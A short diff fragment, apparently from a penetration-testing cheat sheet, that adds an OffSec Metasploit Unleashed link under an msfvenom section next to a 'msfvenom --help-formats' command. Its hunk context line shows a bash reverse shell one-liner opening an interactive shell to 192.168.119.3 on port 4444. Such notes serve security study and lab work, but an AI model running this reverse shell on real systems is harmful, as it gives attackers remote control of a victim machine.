@@ -1158,6 +1158,8 @@ bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
 
 # Msfvenom
 
+[https://www.offsec.com/metasploit-unleashed/msfvenom/](https://www.offsec.com/metasploit-unleashed/msfvenom/)
+
 ~~~ bash
 msfvenom --help-formats
 ~~~
